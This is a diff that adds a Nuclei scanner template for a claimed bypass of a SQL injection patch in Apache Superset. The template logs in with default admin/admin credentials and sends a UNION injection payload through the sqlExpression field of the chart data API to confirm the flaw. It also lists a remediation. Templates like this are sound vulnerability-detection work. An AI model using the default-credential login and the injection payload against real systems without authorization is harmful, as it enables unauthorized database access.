@@ -1,0 +1,135 @@
+id: superset-sqlexpression-union-bypass
+
+info:
+  name: Apache Superset - sqlExpression UNION Injection (CVE-2026-23980 Patch Bypass)
+  author: secuwall
+  severity: high
+  description: |
+    The sqlglot-based rewrite of validate_adhoc_subquery() shipped to fix
+    CVE-2026-23980 can be bypassed. The function passes raw SQL expression
+    fragments to SQLStatement() / sqlglot.parse() which expects complete
+    SQL statements. A UNION injection in sqlExpression (e.g. "1 union
+    select <N> union select 1") is not recognized as a set operation
+    because it lacks a leading SELECT keyword. The validation passes,
+    and the database executes the UNION.
+    Affects Superset 6.0.0, 6.1.0, and current master (7.0.0rc).
+    This is a NEW vulnerability (CVE pending) — a bypass of the
+    CVE-2026-23980 patch, not CVE-2026-23980 itself.
+  remediation: |
+    Wrap the expression in SELECT before parsing:
+    SQLStatement(f"SELECT {sql}", engine) instead of SQLStatement(sql, engine)
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 8.5
+  reference:
+    - https://github.com/apache/superset/commit/c0df7ae96974b0fdc8fb8b0aad2a1520dff8fcf1
+  tags: sqli,superset,apache,union,patch-bypass,default-login
+  metadata:
+    max-request: 3
+    verified: true
+    product: apache-superset
+    vendor: apache
+
+# Usage:
+#
+# 1) Auto-login with default creds (admin/admin):
+#   nuclei -t superset-sqli-union-bypass.yaml -u https://superset.target.com \
+#     -var ds=1
+#
+# 2) Custom credentials:
+#   nuclei -t superset-sqli-union-bypass.yaml -u https://superset.target.com \
+#     -var username=analyst -var password=Welcome1 -var ds=1
+#
+# 3) Pre-obtained token (skip login, pass auth header via -H):
+#   nuclei -t superset-sqli-union-bypass.yaml -u https://superset.target.com \
+#     -var ds=1 -var skip=true \
+#     -H "Authorization: Bearer eyJhbG..."
+#
+#   nuclei -t superset-sqli-union-bypass.yaml -u https://superset.target.com \
+#     -var ds=1 -var skip=true \
+#     -H "X-Guesttoken: eyJhbG..."
+
+variables:
+  marker: "{{rand_int(100000, 999999)}}"
+
+flow: |
+  if (template["skip"] == "true") {
+    http(3);
+  } else {
+    http(1) && http(2) && http(3);
+  }
+
+http:
+  # Request 1: Get CSRF token
+  - raw:
+      - |
+        GET /api/v1/security/csrf_token/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    cookie-reuse: true
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        group: 1
+        regex:
+          - '"result"\s*:\s*"([^"]+)"'
+
+  # Request 2: Login with credentials (default: admin/admin)
+  - raw:
+      - |
+        POST /api/v1/security/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-CSRFToken: {{csrf_token}}
+        Referer: {{BaseURL}}/
+
+        {"username":"{{default(username, 'admin')}}","password":"{{default(password, 'admin')}}","provider":"db","refresh":true}
+
+    cookie-reuse: true
+
+    extractors:
+      - type: json
+        name: access_token
+        internal: true
+        json:
+          - '.access_token'
+
+  # Request 3: SQLi via UNION bypass in sqlExpression
+  - raw:
+      - |
+        POST /api/v1/chart/data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{access_token}}
+
+        {"datasource":{"id":{{default(ds, '1')}},"type":"table"},"queries":[{"columns":[{"label":"ntest","sqlExpression":"1 union select {{marker}} union select 1","expressionType":"SQL"}],"metrics":[],"filters":[],"extras":{"having":"","where":""},"row_limit":10,"order_desc":true,"time_range":"No filter"}],"result_format":"json","result_type":"full"}
+
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "{{marker}}"
+
+      - type: word
+        part: body
+        words:
+          - "result"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: injected_value
+        group: 1
+        regex:
+          - '"ntest"\s*:\s*"?(\d+)"?'
